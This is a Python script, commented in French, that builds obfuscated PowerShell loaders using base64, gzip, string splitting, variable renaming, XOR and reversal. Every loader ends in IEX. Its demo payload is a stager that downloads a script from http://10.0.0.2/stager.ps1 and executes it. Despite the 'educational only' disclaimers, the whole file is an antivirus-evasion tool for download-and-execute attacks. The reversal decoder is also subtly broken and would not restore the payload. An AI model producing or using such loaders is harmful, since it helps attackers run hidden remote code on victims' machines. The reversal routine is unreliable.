#!/usr/bin/env python3
"""
Obfuscation Module - Techniques Publiques et Documentées
Niveau: Basique à Intermédiaire (éducatif uniquement)
"""

import base64
import gzip
import random
import string
import os

class PayloadObfuscator:
    """Classe d'obfuscation avec techniques publiques connues"""
    
    def __init__(self, output_dir="payloads/obfuscated/"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    # ═══════════════════════════════════════════════════════
    # 1️⃣ ENCODAGE BASE64 (Simple et Multi-couches)
    # ═══════════════════════════════════════════════════════
    
    def base64_simple(self, payload, name="b64_payload.txt"):
        """Encodage Base64 simple"""
        encoded = base64.b64encode(payload.encode()).decode()
        output = os.path.join(self.output_dir, name)
        with open(output, "w") as f:
            f.write(encoded)
        print(f"[+] Base64 simple: {output}")
        return encoded
    
    def base64_multi_layer(self, payload, layers=3, name="b64_multi.txt"):
        """Encodage Base64 multicouche"""
        result = payload
        for i in range(layers):
            result = base64.b64encode(result.encode()).decode()
        
        # Script de décodage PowerShell
        decoder = f"""
$enc = "{result}"
for($i=0; $i -lt {layers}; $i++){{
    $enc = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
}}
IEX $enc
"""
        output = os.path.join(self.output_dir, name)
        with open(output, "w") as f:
            f.write(decoder)
        print(f"[+] Base64 {layers} couches: {output}")
        return decoder
    
    # ═══════════════════════════════════════════════════════
    # 2️⃣ COMPRESSION GZIP + BASE64
    # ═══════════════════════════════════════════════════════
    
    def gzip_base64(self, payload, name="gzip_payload.ps1"):
        """Compression GZIP + Base64"""
        compressed = gzip.compress(payload.encode())
        b64 = base64.b64encode(compressed).decode()
        
        decoder = f"""
$data = "{b64}"
$bytes = [System.Convert]::FromBase64String($data)
$ms = New-Object System.IO.MemoryStream(,$bytes)
$gs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($gs)
$decoded = $sr.ReadToEnd()
IEX $decoded
"""
        output = os.path.join(self.output_dir, name)
        with open(output, "w") as f:
            f.write(decoder)
        print(f"[+] GZIP+Base64: {output}")
        return decoder
    
    # ═══════════════════════════════════════════════════════
    # 3️⃣ CONCATENATION ET DÉCOUPAGE DE CHAÎNES
    # ═══════════════════════════════════════════════════════
    
    def string_concat(self, payload, chunk_size=5, name="concat_payload.ps1"):
        """Découpage et concaténation de chaînes"""
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        # Génération de variables aléatoires
        vars = [self._random_var() for _ in chunks]
        
        script = ""
        for var, chunk in zip(vars, chunks):
            script += f'${var} = "{chunk}"\n'
        
        concat = " + ".join([f"${v}" for v in vars])
        script += f"$final = {concat}\nIEX $final"
        
        output = os.path.join(self.output_dir, name)
        with open(output, "w") as f:
            f.write(script)
        print(f"[+] String concat: {output}")
        return script
    
    # ═══════════════════════════════════════════════════════
    # 4️⃣ RENOMMAGE DE VARIABLES (Obfuscation Basique)
    # ═══════════════════════════════════════════════════════
    
    def variable_rename(self, ps_script, name="renamed_payload.ps1"):
        """Renommage aléatoire des variables PowerShell"""
        # Liste des variables communes à renommer
        common_vars = ["$client", "$stream", "$data", "$result", "$command"]
        
        script = ps_script
        for var in common_vars:
            if var in script:
                new_var = "$" + self._random_var()
                script = script.replace(var, new_var)
        
        output = os.path.join(self.output_dir, name)
        with open(output, "w") as f:
            f.write(script)
        print(f"[+] Variables renommées: {output}")
        return script
    
    # ═══════════════════════════════════════════════════════
    # 5️⃣ XOR ENCODING (Technique Classique)
    # ═══════════════════════════════════════════════════════
    
    def xor_encode(self, payload, key=0x42, name="xor_payload.ps1"):
        """Encodage XOR simple"""
        xor_bytes = [ord(c) ^ key for c in payload]
        xor_array = ",".join([str(b) for b in xor_bytes])
        
        decoder = f"""
$enc = @({xor_array})
$key = {key}
$dec = -join ($enc | ForEach-Object {{ [char]($_ -bxor $key) }})
IEX $dec
"""
        output = os.path.join(self.output_dir, name)
        with open(output, "w") as f:
            f.write(decoder)
        print(f"[+] XOR encodé: {output}")
        return decoder
    
    # ═══════════════════════════════════════════════════════
    # 6️⃣ REVERSE STRING (Technique Simple)
    # ═══════════════════════════════════════════════════════
    
    def reverse_string(self, payload, name="reverse_payload.ps1"):
        """Inversion de chaîne"""
        reversed_payload = payload[::-1]
        
        decoder = f"""
$rev = "{reversed_payload}"
$dec = -join ($rev.ToCharArray() | Sort-Object {{$_.Length}} -Descending)
IEX $dec
"""
        output = os.path.join(self.output_dir, name)
        with open(output, "w") as f:
            f.write(decoder)
        print(f"[+] String inversé: {output}")
        return decoder
    
    # ═══════════════════════════════════════════════════════
    # HELPER FUNCTIONS
    # ═══════════════════════════════════════════════════════
    
    def _random_var(self, length=8):
        """Génère un nom de variable aléatoire"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))


# ═══════════════════════════════════════════════════════
# EXEMPLE D'UTILISATION
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    obf = PayloadObfuscator()
    
    # Payload de test (stager simple)
    test_payload = """
    $client = New-Object System.Net.WebClient
    $url = "http://10.0.0.2/stager.ps1"
    IEX $client.DownloadString($url)
    """
    
    print("\n🔐 OBFUSCATION PÉDAGOGIQUE - TECHNIQUES PUBLIQUES\n")
    
    # Tester toutes les techniques
    obf.base64_simple(test_payload, "01_base64_simple.ps1")
    obf.base64_multi_layer(test_payload, layers=3, name="02_base64_multi.ps1")
    obf.gzip_base64(test_payload, "03_gzip_b64.ps1")
    obf.string_concat(test_payload, chunk_size=10, name="04_concat.ps1")
    obf.variable_rename(test_payload, "05_renamed.ps1")
    obf.xor_encode(test_payload, key=0x42, name="06_xor.ps1")
    obf.reverse_string(test_payload, "07_reverse.ps1")
    
    print("\n✅ Tous les payloads obfusqués générés dans payloads/obfuscated/")
    print("⚠️  RAPPEL: Usage strictement pédagogique et défensif uniquement")
